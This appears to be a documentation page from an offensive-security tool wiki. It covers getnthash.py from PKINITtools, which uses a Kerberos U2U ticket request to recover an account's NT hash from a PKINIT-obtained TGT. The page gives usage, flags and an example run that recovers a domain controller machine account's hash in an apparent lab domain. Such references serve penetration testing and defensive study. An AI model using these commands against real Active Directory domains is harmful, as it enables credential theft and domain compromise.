---
title : "getnthash.py"
# pre : ' '
description : "Use Kerberos U2U to submit a TGS request for yourself."
date : 2023-12-03T06:11:46+01:00
# hidden : true
# draft : true
weight : 10
# tags : ['']
---

---

Use Kerberos U2U to submit a TGS request for yourself.

Use Kerberos U2U to submit a TGS request for yourself. This will include with the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that was used for your specific TGT. It's magic really. This tool requires a TGT resulting from PKINIT to be in your `KRB5CCNAME` env variable.

## Installation

Install [PKINITtools]({{< ref "pkinittools" >}}).

## Usage

```plain
getnthash.py [-h] -key KEY [-dc-ip ip address] [-debug] identity
```

## Flags

```plain
positional arguments:
  identity           domain/username

options:
  -h, --help         show this help message and exit
  -key KEY           AS REP key from gettgtpkinit.py
  -dc-ip ip address  IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -debug             Turn DEBUG output ON
```

## Examples

```plain
(PKINITtools) user@localhost:~/PKINITtools$ export KRB5CCNAME=s2019dc.ccache
(PKINITtools) user@localhost:~/PKINITtools$ python getnthash.py testsegment.local/s2019dc\$ -key 5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
fa6b130d73311d1be5495f589f9f4571
```
